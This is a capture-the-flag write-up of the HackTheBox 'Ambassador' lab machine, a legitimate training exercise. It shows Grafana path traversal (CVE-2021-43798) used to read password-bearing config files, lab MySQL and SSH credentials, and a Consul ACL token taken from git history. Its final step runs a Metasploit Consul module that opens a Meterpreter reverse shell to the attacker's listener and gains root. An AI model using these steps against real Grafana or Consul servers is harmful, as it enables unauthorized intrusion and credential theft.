Hello there, this is write up for Ambasador box from Hackthebox.

Starting off with nmap scan on all ports:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 08:22 EST
Nmap scan report for 10.10.11.183 (10.10.11.183)
Host is up (0.075s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2

```

We see 4 ports open ssh, http, 3000 which we don't know what it is yet and 3306 which is mysql. Visiting webpage first:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Ambassador/images/IMG1.png?raw=true)

The website is just static web page. Running feroxbuster doesn't give us anything interesting. Moving on to the
port 3000 we see instance of grafana:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Ambassador/images/IMG2.png?raw=true)

Grafana is so kind that it gives us version right away on the bottom of the page - v8.2.0. Searching for exploits for this version
we find lfi - cve 2021-43798. https://www.exploit-db.com/exploits/50581

Since it is just making request we can catch the one from website in burp and perform the lfi there:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Ambassador/images/IMG3.png?raw=true)

With this, we can look to common grafana files like grafana.ini which contains password:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Ambassador/images/IMG4.png?raw=true)

Looking through the grafana web interface, there isn't anything interesting except the .yaml config file which we can't 
read from web interface. Searching for where this file is stored at we find that it is in `grafana/provisioning/datasources/mysql.yaml`.
And that gives us another password when used as payload for our lfi. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Ambassador/images/IMG5.png?raw=true)

Trying that for ssh doesn't work. Last thing we have is mysql on port 3306. Using the password and username grafan works:

```
# mysql -h 10.10.11.183 -u grafana -p'dontStandSoCloseToMe63221!'                                                                                                                                                                      
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 65
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

```

Basic enumeration leads to password for user developer that is base64 encoded 

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.054 sec)

MySQL [(none)]> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.052 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.059 sec)

```

Decoding that in terminal:

```
# echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d                                                                                                                                                                          
anEnglishManInNewYork027468
```

And login in:

```
# ssh developer@10.10.11.183
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
```

Looking through the filesystem we find this:

```
developer@ambassador:/opt$ ls
consul  my-app
```

Looking in searchsploit for exploits we find this:

```
# searchsploit consul
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                                                                                                                                         | linux/remote/46073.rb
````

For this exploit to work we need two things. One set up ssh tunnel and two when we do show options we see that it needs acl token.
Searching some more through file system we find this in git history:

```
developer@ambassador:/opt/my-app/whackywidget$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app/whackywidget$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

With this we can set up ssh port forwarding (dropping to ssh prompt is done with \~C enter):

```
developer@ambassador:~$ 
ssh> -L 8500:localhost:8500
Forwarding port.

```

Now we set up metasploit and run exploit:

```
msf6 exploit(multi/misc/consul_service_exec) > show options

Module options (exploit/multi/misc/consul_service_exec):

   Name       Current Setting                       Required  Description
   ----       ---------------                       --------  -----------
   ACL_TOKEN  bb03b43b-1d81-d62b-24b5-39540ee469b5  no        Consul Agent ACL token
   Proxies                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     localhost                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8500                                  yes       The target port (TCP)
   SRVHOST    0.0.0.0                               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080                                  yes       The local port to listen on.
   SSL        false                                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                                     yes       The base path
   URIPATH                                          no        The URI to use for this exploit (default is random)
   VHOST                                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux


msf6 exploit(multi/misc/consul_service_exec) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP handler on 10.10.14.207:4444 
[*] Creating service 'FIpei'
[-] Exploit aborted due to failure: unexpected-reply: An error occured when contacting the Consul API.
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 10.10.14.207:4444 
[*] Creating service 'LIWuJ'
[*] Service 'LIWuJ' successfully created.
[*] Waiting for service 'LIWuJ' script to trigger
[*] Sending stage (1017704 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.207:4444 -> 10.10.11.183:44028) at 2023-02-05 20:09:45 -0500
[*] Removing service 'LIWuJ'
[*] Command Stager progress - 100.00% done (763/763 bytes)
[*] Session 1 created in the background.
msf6 exploit(multi/misc/consul_service_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2578 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)

```

And we are root and the box is done.

Thanks for reading this write up u can message me on twitter https://twitter.com/Vojtech1337 and until next time!